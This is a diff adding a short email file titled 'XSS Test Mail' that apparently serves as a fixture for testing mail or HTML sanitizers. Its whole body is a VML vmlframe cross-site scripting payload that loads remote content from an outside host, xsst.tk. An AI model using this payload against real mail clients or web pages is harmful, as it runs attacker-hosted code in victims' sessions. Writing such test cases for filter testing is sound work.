@@ -1,0 +1,4 @@
+From: xafira.mendonsa@enron.com
+To: mgentry@hwallp.com
+Subject: XSS Test Mail
+<vmlframe xmlns="url:schemas-microsoft-com:vml" style="behavior:url(#default#vml);position:absolute;width:100%;height:100%" src="http://xsst.tk/mail.vml#xss"></vmlframe>
